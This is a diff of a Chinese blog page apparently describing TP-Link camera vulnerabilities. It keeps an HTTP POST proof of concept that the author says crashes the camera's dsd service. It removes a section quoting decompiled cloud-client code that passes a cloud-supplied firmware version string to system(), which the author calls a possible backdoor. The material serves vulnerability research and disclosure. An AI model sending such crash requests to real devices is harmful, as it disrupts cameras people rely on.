@@ -19,7 +19,7 @@
 <meta property="og:image" content="http://yoursite.com/img/IPC43AN-4.png">
 <meta property="og:image" content="http://yoursite.com/img/IPC43AN-4-1.png">
 <meta property="og:image" content="http://yoursite.com/img/IPC43AN-4-2.png">
-<meta property="og:updated_time" content="2020-05-23T05:27:56.370Z">
+<meta property="og:updated_time" content="2020-07-31T01:17:22.634Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="TP-Link 摄像头漏洞">
 <meta name="twitter:description" content="栈溢出首先获取摄像头的固件，下载地址： https://service.tp-link.com.cn/detail_download_7631.html">
@@ -234,13 +234,6 @@
 <p>另外在测试漏洞的过程中，我发现了另外一个能够使 dsd 程序崩溃的 POC：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /stok=*/ds HTTP/1.1</span><br><span class="line">Host: 192.168.3.20</span><br><span class="line">Content-Length: 326</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36</span><br><span class="line">Content-Type: application/json; charset=UTF-8</span><br><span class="line">Origin: http://192.168.3.20</span><br><span class="line">Referer: http://192.168.3.20/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close</span><br><span class="line">&#123;&quot;system&quot;:&#123;&quot;config_recovery&quot;:&#123;&quot;config_name&quot;:[&#123;&quot;id&quot;:&quot;1&quot;,&quot;pt1_x&quot;:&quot;1657&quot;,&quot;pt1_y&quot;:&quot;4382&quot;,&quot;pt2_x&quot;:&quot;9253&quot;,&quot;pt2_y&quot;:&quot;4413&quot;,&quot;direction&quot;:&quot;AtoB&quot;,&quot;sensitivity&quot;:&quot;50&quot;,&quot;people_enabled&quot;:&quot;off&quot;&#125;,&#123;&quot;id&quot;:&quot;2&quot;,&quot;pt1_x&quot;:&quot;1206&quot;,&quot;pt1_y&quot;:&quot;1574&quot;,&quot;pt2_x&quot;:&quot;9392&quot;,&quot;pt2_y&quot;:&quot;1327&quot;,&quot;direction&quot;:&quot;BtoA&quot;,&quot;sensitivity&quot;:&quot;50&quot;,&quot;people_enabled&quot;:&quot;off&quot;&#125;]&#125;&#125;,&quot;method&quot;:&quot;do&quot;&#125;</span><br></pre></td></tr></table></figure>
 
-<h2 id="疑似后门"><a href="#疑似后门" class="headerlink" title="疑似后门"></a>疑似后门</h2><p>值得一提的是目前 IOT 产品都具备手机 APP 远程操控的功能，也就是说设备需要和厂商的云服务器进行通信，我们分析的这款摄像头也不例外，用户可以在手机上面安装某 app 从而实现远程查看摄像头画面，远程遥控、报警等功能。</p>
-<p><strong>不过你真的放心把它安装在自己家中吗？</strong></p>
-<p>经过进一步的分析，我发现此设备和云端交互依赖二进制程序  cloud-client ，在函数 sub_18E4C 中存在这样一段代码：</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(&amp;v72, <span class="number">0</span>, <span class="number">0x1F4</span>u);</span><br><span class="line"><span class="built_in">snprintf</span>(&amp;v72, <span class="number">0x1F4</span>u, <span class="string">"New FW Ver %s."</span>, v64, v46);</span><br><span class="line">Log((<span class="keyword">int</span>)&amp;v72);</span><br><span class="line"><span class="keyword">if</span> ( sub_1317C(v67, &amp;s, <span class="number">1024</span>) )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_63;</span><br><span class="line">v67 = &amp;s;</span><br><span class="line"><span class="keyword">if</span> ( sub_15704((<span class="keyword">int</span>)<span class="string">"cloud_config"</span>, &amp;v63, v6 ^ <span class="number">1</span>) )</span><br><span class="line">  <span class="keyword">goto</span> LABEL_62;</span><br><span class="line">v61 = <span class="number">4</span>;</span><br><span class="line">sub_13B6C(&amp;v59);</span><br><span class="line"><span class="keyword">if</span> ( !v6 &amp;&amp; v64 )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">memset</span>(command, <span class="number">0</span>, <span class="number">0x200</span>u);</span><br><span class="line">  <span class="built_in">snprintf</span>(command, <span class="number">0x200</span>u, <span class="string">"%s%s"</span>, <span class="string">"echo "</span>, v64);</span><br><span class="line">  system(command);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>设备向云服务器请求新版本固件，得到版本号会以 log 形式打印出来。但是下方又使用了 system 执行 echo 命令直接把版本号打印在控制台上面，虽然目前并不清楚这段代码能否得到执行，但是这里也存在着很大的风险。作为攻击者可能难以控制这段数据，但是作为云端控制者的厂商却能够完全掌握发送哪些数据。</p>
-<p>你的摄像头真的安全吗？</p>
 
       
 
@@ -373,7 +366,7 @@
                 </span>
                 <span class="tooltip-content">
                     <div class="toc-article">
-                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-number">1.</span> <span class="toc-text">栈溢出</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#疑似后门"><span class="toc-number">2.</span> <span class="toc-text">疑似后门</span></a></li></ol>
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#栈溢出"><span class="toc-number">1.</span> <span class="toc-text">栈溢出</span></a></li></ol>
                     </div>
                 </span>
             </div>
